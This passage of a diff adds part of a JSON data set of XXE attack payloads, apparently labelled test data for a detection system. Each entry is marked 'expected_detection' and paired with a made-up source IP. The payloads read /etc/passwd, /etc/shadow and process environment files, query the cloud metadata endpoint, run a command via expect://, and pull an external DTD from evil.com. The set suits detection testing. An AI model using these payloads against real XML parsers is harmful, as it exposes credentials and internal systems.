+    "timestamp": "2026-03-13T21:39:20.652440"
+  },
+  {
+    "id": "xxe_0084",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "54.239.155.199",
+    "timestamp": "2026-03-13T21:39:20.652445"
+  },
+  {
+    "id": "xxe_0085",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo></foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "195.113.160.92",
+    "timestamp": "2026-03-13T21:39:20.652450"
+  },
+  {
+    "id": "xxe_0086",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "31.121.17.240",
+    "timestamp": "2026-03-13T21:39:20.652454"
+  },
+  {
+    "id": "xxe_0087",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "74.61.153.244",
+    "timestamp": "2026-03-13T21:39:20.652461"
+  },
+  {
+    "id": "xxe_0088",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "41.217.54.158",
+    "timestamp": "2026-03-13T21:39:20.652466"
+  },
+  {
+    "id": "xxe_0089",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "34.239.38.175",
+    "timestamp": "2026-03-13T21:39:20.652470"
+  },
+  {
+    "id": "xxe_0090",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "166.246.4.223",
+    "timestamp": "2026-03-13T21:39:20.652475"
+  },
+  {
+    "id": "xxe_0091",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "212.64.244.102",
+    "timestamp": "2026-03-13T21:39:20.652480"
+  },
+  {
+    "id": "xxe_0092",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "31.177.67.116",
+    "timestamp": "2026-03-13T21:39:20.652484"
+  },
+  {
+    "id": "xxe_0093",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "92.184.127.177",
+    "timestamp": "2026-03-13T21:39:20.652491"
+  },
+  {
+    "id": "xxe_0094",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo></foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "220.30.134.126",
+    "timestamp": "2026-03-13T21:39:20.652496"
+  },
+  {
+    "id": "xxe_0095",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "12.11.51.176",
+    "timestamp": "2026-03-13T21:39:20.652501"
+  },
+  {
+    "id": "xxe_0096",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "190.169.65.131",
+    "timestamp": "2026-03-13T21:39:20.652505"
+  },
+  {
+    "id": "xxe_0097",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "186.125.171.78",
+    "timestamp": "2026-03-13T21:39:20.652510"
+  },
+  {
+    "id": "xxe_0098",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "8.222.212.200",
+    "timestamp": "2026-03-13T21:39:20.652514"
+  },
+  {
+    "id": "xxe_0099",
+    "type": "xxe",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "severity": "high",
+    "expected_detection": true,
+    "source_ip": "70.202.175.42",
+    "timestamp": "2026-03-13T21:39:20.652519"
+  }
+]
